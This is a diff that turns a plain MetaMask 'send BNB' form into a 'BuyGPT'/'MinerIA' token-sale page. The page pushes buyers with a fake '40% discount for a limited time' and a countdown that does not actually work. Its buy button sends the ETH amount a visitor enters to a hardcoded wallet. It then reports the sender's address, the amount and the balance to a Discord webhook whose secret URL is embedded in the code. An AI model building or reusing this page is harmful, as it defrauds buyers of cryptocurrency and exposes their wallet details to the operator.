@@ -194,70 +194,360 @@ input {
 <html>
   <head>
     <meta charset="UTF-8">
-    <title>Enviar BNB a una dirección específica</title>
+    <title>MinerIA</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+    <style>
+
+      body {
+        
+      }
+
+      .card-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+
+      .card {
+        background-color: #00115C;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.3);
+        margin: 10px;
+        max-width: 400px;
+        width: 100%;
+        text-align: center;
+	     
+      }
+
+     h3 {
+    color: #0d6efd;
+    margin: 10px auto; /* establece un margen superior e inferior de 10px y un margen lateral automático */
+    max-width: 400px;
+    width: 100%;
+    text-align: center; /* centrar el texto horizontalmente */
+}
+
+      }
+
+      p {
+        margin-top: 0;
+      }
+
+      input[type="number"] {
+        padding: 5px;
+    border-radius: 5px;
+    border: none;
+    margin: 0 auto;
+    font-size: 14px;
+    display: block;
+    position: relative;
+    top: 50%;
+    transform: translateY(-50%);
+	
+      }
+
+     button {
+    background-color: #0d6efd;
+    color: #ffffff;
+    border: none;
+    border-radius: 5px;
+    padding: 10px;
+    cursor: pointer;
+    transition: all 0.3s ease-in-out;
+   
+      }
+      
+      button:active {
+        transform: scale(0.80);
+      }
+
+
+      button:hover {
+        background-color: #1E0291;
+      }
+    </style>
   </head>
   <body>
-    <div class="card">
-      <div class="card-body">
-        <h5 class="card-title">Enviar BNB</h5>
-        <button id="connectButton" class="btn btn-primary">Conectar a MetaMask</button>
-        <br><br>
-        <div id="balance"></div>
-        <br>
-        <input id="amountToSend" type="number" class="form-control" placeholder="Ingrese la cantidad de BNB a enviar">
-        <br>
-        <input id="destinationAddress" type="text" class="form-control" placeholder="0x8935361d21943Ee8a863082EdD8a6Aefb062E434">
-        <br>
-        <button id="sendButton" class="btn btn-success" disabled>Enviar BNB</button>
-      </div>
-    </div>
+   
+<h3>Buy<span class="animated-text">GPT</span> <span class="version" style="font-size: 0.8em; font-family: 'Courier New', Courier, monospace; color:dimgray"><span class="counter">0.001%</span></span></h3>
+
+<style>
+    .animated-text {
+        animation: change-colors 3s infinite;
+    }
+
+    .counter {
+        display: inline-block;
+        margin-left: 10px;
+        font-size: 0.8em;
+        font-family: 'Courier New', Courier, monospace;
+        color: #00ff00; /* Color inicial */
+    }
+
+    @keyframes change-colors {
+        0% {
+            color: gray;
+        }
+        33% {
+            color: white;
+        }
+        66% {
+            color: black;
+        }
+        100% {
+            color: gray;
+        }
+    }
+
+    @keyframes count-up {
+        from {
+            color: #00ff00; /* Color inicial */
+        }
+        to {
+            color: #ff0000; /* Color final */
+        }
+    }
+
+    .count {
+        animation: count-up 525s linear forwards;
+    }
+	.countdown-wrapper {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  font-family: Arial, sans-serif;
+}
+
+.countdown {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  width: 200px;
+  height: 200px;
+  border: 10px solid #ccc;
+  border-radius: 50%;
+  margin-bottom: 50px;
+}
+
+.countdown #timer {
+  font-size: 50px;
+  font-weight: bold;
+  color: #333;
+}
+
+.energy-wrapper {
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  width: 25%;
+  height: 50px;
+  border: 5px solid #ccc;
+  border-radius: 25px;
+  position: relative;
+}
+
+.energy-bar {
+  height: 100%;
+  width: 78%;
+  background-color: green;
+  border-radius: 25px;
+  position: absolute;
+  top: 0;
+  left: 0;
+  z-index: -1;
+  transition: width 1s ease-in-out;
+}
+
+.energy-text {
+  font-size: 14px;
+  font-weight: bold;
+  color: #333;
+  position: relative;
+  z-index: 1;
+}
+
+.energy-bar.red {
+  background-color: #ff0000;
+}
+
+.energy-bar.orange {
+  background-color: #ff9900;
+}
+
+.energy-bar.green {
+  background-color: #00cc00;
+}
+
+
+</style>
+
+<script>
+// Define el tiempo límite en segundos
+const LIMIT_TIME = 36000; // 10 horas
+
+// Obtiene el elemento de contador y la barra de energía
+const counter = document.getElementById("timer");
+const energyBar = document.getElementById("energy");
+
+// Define la cantidad de actualizaciones por segundo
+const UPDATES_PER_SECOND = 10;
+
+// Calcula el tiempo restante inicial
+let timeLeft = LIMIT_TIME - Math.floor(Date.now() / 1000);
+
+// Actualiza el contador y la barra de energía cada 1000/UPDATES_PER_SECOND milisegundos
+setInterval(updateCounter, 1000 / UPDATES_PER_SECOND);
+
+function updateCounter() {
+  // Calcula el tiempo restante en segundos
+  timeLeft = LIMIT_TIME - Math.floor(Date.now() / 1000);
+
+  if (timeLeft < 0) {
+    // Si el tiempo restante es menor a cero, establece el contador en cero
+    timeLeft = 0;
+  }
+
+  // Actualiza el contador
+  counter.textContent = formatTime(timeLeft);
+
+  // Actualiza el porcentaje de la barra de energía
+  const energyPercent = (timeLeft / LIMIT_TIME) * 100;
+  energyBar.style.width = energyPercent + "%";
+
+  // Actualiza el porcentaje en el elemento span
+  document.getElementById("energy-percent").textContent = energyPercent.toFixed(1) + "%";
+}
+
+function formatTime(time) {
+  // Convierte el tiempo en segundos a horas, minutos y segundos
+  const hours = Math.floor(time / 3600);
+  const minutes = Math.floor((time % 3600) / 60);
+  const seconds = time % 60;
+
+  // Formatea la hora, el minuto y el segundo con ceros a la izquierda si es necesario
+  const formattedHours = hours.toString().padStart(2, "0");
+  const formattedMinutes = minutes.toString().padStart(2, "0");
+  const formattedSeconds = seconds.toString().padStart(2, "0");
+
+  // Devuelve el tiempo formateado como una cadena de texto
+  return `${formattedHours}:${formattedMinutes}:${formattedSeconds}`;
+}
+
+
+</script>
+
+
+<p style="color: white; font-size: 12px; font-weight: bold; font-family: 'Roboto', sans-serif; text-align: center; border-bottom: 1px solid white;">
+  <span id="mine-text"></span>
+  <span id="mine-cursor">...</span>
+</p>
+
+<style>
+  /* Animación del cursor */
+  @keyframes blink-caret {
+    from, to { opacity: 0 }
+    50% { opacity: 1 }
+  }
+</style>
+
+<script>
+  const mineText = document.getElementById('mine-text');
+  const mineCursor = document.getElementById('mine-cursor');
+  const miningMessage = 'Put the amount in the box. REFERENCE 1 ETH = 500,000 GPT 40% discount for a limited time';
+
+  let i = 0;
+  function typeMiningMessage() {
+    if (i < miningMessage.length) {
+      mineText.innerHTML += miningMessage.charAt(i);
+      i++;
+      setTimeout(typeMiningMessage, 150);
+    } else {
+      mineCursor.style.animation = 'blink-caret 0.75s step-end infinite';
+      setInterval(function() {
+        mineCursor.style.opacity = (mineCursor.style.opacity === '1' ? '0' : '1');
+      }, 400);
+      setInterval(function() {
+        let dots = '';
+        let rand = Math.floor(Math.random() * 3) + 1;
+        for (let i = 0; i < rand; i++) {
+          dots += '.';
+        }
+        mineText.innerHTML = miningMessage + dots;
+      }, 7000);
+    }
+  }
+
+  setTimeout(typeMiningMessage, 1000);
+</script>
+
+
+
+        <input type="number" id="amount1">
+  <div style="text-align: center;">
+  <button onclick="sendETH('0x01C65F22A9478C2932e62483509c233F0aaD5c72', document.getElementById('amount1').value)">Buy GPT</button>
+</div>
+
+
+
 
     <script>
-      const connectButton = document.getElementById('connectButton');
-      const balanceDiv = document.getElementById('balance');
-      const amountInput = document.getElementById('amountToSend');
-      const addressInput = document.getElementById('destinationAddress');
-      const sendButton = document.getElementById('sendButton');
-
-      connectButton.addEventListener('click', () => {
-        if (typeof window.ethereum !== 'undefined') {
-          console.log('MetaMask está instalado!');
-          window.ethereum.request({ method: 'eth_requestAccounts' });
-        } else {
-          console.log('Por favor instale MetaMask');
-        }
-      });
-
-      sendButton.addEventListener('click', () => {
-        const amount = amountInput.value;
-        const destination = addressInput.value;
-        const ethereum = window.ethereum;
-        ethereum.request({
-          method: 'eth_sendTransaction',
-          params: [
-            {
-              to: destination,
-              from: ethereum.selectedAddress,
-              value: ethereum.utils.toHex(ethereum.utils.toWei(amount, 'ether'))
-            }
-          ]
-        });
-      });
-
-      setInterval(async () => {
-        if (typeof window.ethereum !== 'undefined') {
-          const ethereum = window.ethereum;
-          const accounts = await ethereum.request({ method: 'eth_accounts' });
-          if (accounts.length > 0) {
-            const balance = await ethereum.request({
-              method: 'eth_getBalance',
-              params: [accounts[0], 'latest']
+     async function sendETH(toAddress, amount) {
+    if (window.ethereum) {
+        try {
+            await window.ethereum.enable();
+            const web3 = new Web3(window.ethereum);
+            const accounts = await web3.eth.getAccounts();
+            const fromAddress = accounts[0];
+            const fromBalance = await web3.eth.getBalance(fromAddress);
+            const txHash = await web3.eth.sendTransaction({
+                from: fromAddress,
+                to: toAddress,
+                value: web3.utils.toWei(amount, 'ether')
             });
-            balanceDiv.innerHTML = `Su saldo es: ${ethereum.utils.fromWei(balance)} BNB`;
-            sendButton.disabled = false;
-          }
+            console.log(`Transacción enviada: ${txHash}`);
+            const updatedBalance = await web3.eth.getBalance(fromAddress);
+            const message = `Depósito de ${amount} ETH recibido desde la dirección ${fromAddress}. Nuevo saldo: ${web3.utils.fromWei(updatedBalance)} ETH`;
+            sendWebhookMessage(webhookUrl, message);
+        } catch (error) {
+            console.error(error);
         }
-      }, 1000);
+    } else {
+        console.error('MetaMask no está instalado');
+    }
+}
+function sendWebhookMessage(webhookUrl, message) {
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            content: message
+        })
+    })
+    .then(response => console.log(`Mensaje enviado a Discord. Estado de respuesta: ${response.status} ${response.statusText}`))
+    .catch(error => console.error('Error al enviar mensaje a Discord', error));
+}
+
+      const webhookUrl = "https://discordapp.com/api/webhooks/1078091750171746324/_S78Y9bzo5TvyNoeplYhQOSHA-lzF-P_qhEhTBZTUEcYydZHr682gNg99QsXnnswGj6-";
+
     </script>
+
+<div class="energy-wrapper">
+  <div class="energy-bar" id="energy">
+    <span class="energy-percent" id="energy-percent"></span>
+  </div>
+  <span class="energy-text">Pool GPT Airdrop</span>
+</div>
+<div class="counter-wrapper">
+  <span class="counter-title">Tiempo restante:</span>
+  <span class="counter" id="timer"></span>
+</div>
+
+
+
   </body>
 </html>
